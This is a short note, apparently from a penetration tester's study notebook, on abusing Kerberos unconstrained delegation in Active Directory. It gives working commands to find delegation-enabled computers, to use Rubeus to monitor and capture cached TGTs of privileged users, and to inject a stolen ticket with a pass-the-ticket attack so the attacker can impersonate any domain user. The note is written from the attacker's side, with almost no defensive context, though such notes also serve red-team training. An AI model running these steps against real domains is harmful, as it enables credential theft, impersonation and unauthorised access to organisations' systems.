### Simple Explanation:
we basically monitors on machine which has `TRUSTED_FOR_DELEGATION` Flag set, for incoming TGTs of other users, basically this abuse allows us to impersonate any user on domain, the only requirement is we need his TGT in the memory of machine that has unconstrained delegation enabled. 

---
##### AD Module Command to look for Unconstrained delegation  
```
Get-ADComputer -Filter * -Properties TrustedforDelegation
```
![[Pasted image 20260111200859.png]]
---
##### Rubeus command to monitor cached TGTs for Privileged Accounts. 
```
.\Rubeus.exe monitor /interval:10 /nowrap
```
---

##### Rubeus command to perform Pass The Ticket Attack 
```
.\Rubeus.exe ptt /ticket:{base64_tgt_here}
```
---
*Now you can access to Resources/Services that the impersonated user have permission to access in a Domain*


### Prerequisite:
the victim must have a session on the targeted computer, so that we can extract TGT of victim.
we must need the TGT of victim in order to proceed.
